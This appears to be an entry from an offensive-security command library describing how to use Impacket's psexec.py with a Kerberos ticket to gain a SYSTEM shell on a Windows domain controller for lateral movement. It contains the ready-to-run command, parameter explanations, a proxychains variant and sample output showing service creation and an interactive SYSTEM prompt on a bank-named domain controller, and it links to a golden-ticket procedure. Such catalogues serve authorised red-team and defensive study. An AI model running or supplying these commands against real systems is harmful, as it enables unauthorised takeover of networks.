---
id: c9bd2dd9-f80c-4d21-a1d8-46b906230e69
name: psexec-spawn-system-shell-with-ticket
type: command
executor: bash
data: psexec.py Administrator@$_DC_NAME -k -no-pass -dc-ip $_DC_IP
output: >-
  root@kali:~/Documents# proxychains4 -q psexec.py Administrator@dc01.bank.local
  -k -no-pass -dc-ip 10.10.10.5

  Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth
  Corporation


  [*] Requesting shares on dc01.bank.local.....

  [*] Found writable share ADMIN$

  [*] Uploading file CTNWrpxH.exe

  [*] Opening SVCManager on dc01.bank.local.....

  [*] Creating service WiEc on dc01.bank.local.....

  [*] Starting service WiEc.....

  [!] Press help for extra shell commands

  Microsoft Windows [Version 10.0.14393]

  (c) 2016 Microsoft Corporation. All rights reserved.


  C:\Windows\system32>
created_at: '2020-06-24T05:08:26.192791+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
  - Windows
tags:
  - lateral-movement
  - shell
verified: true
validated: true
---

# psexec-spawn-system-shell-with-ticket

## Command

```bash
psexec.py Administrator@$_DC_NAME -k -no-pass -dc-ip $_DC_IP
```

## Description

This command uses Impacket's psexec.py to spawn a SYSTEM shell on a remote Windows machine by uploading and starting a temporary service, authenticating via Kerberos ticket.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Administrator@$_DC_NAME | Username@target FQDN | Yes |
| -k | Use Kerberos ticket from ccache | Yes |
| -no-pass | No password prompt | Yes |
| -dc-ip $_DC_IP | Domain controller IP for resolution | Yes |

## Examples

### Basic Usage

```bash
psexec.py Administrator@dc01.bank.local -k -no-pass -dc-ip 10.10.10.5
```

### Advanced Usage

With proxy:
```bash
proxychains psexec.py user@target -k -no-pass -dc-ip ip
```

## Expected Output

```
root@kali:~/Documents# proxychains4 -q psexec.py Administrator@dc01.bank.local -k -no-pass -dc-ip 10.10.10.5
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on dc01.bank.local.....
[*] Found writable share ADMIN$
[*] Uploading file CTNWrpxH.exe
[*] Opening SVCManager on dc01.bank.local.....
[*] Creating service WiEc on dc01.bank.local.....
[*] Starting service WiEc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Interactive Windows shell as SYSTEM.

## Related

- [[procedures/Create-Golden-Ticket-and-Launch-Windows-SYSTEM-Shell-from-Linux]]
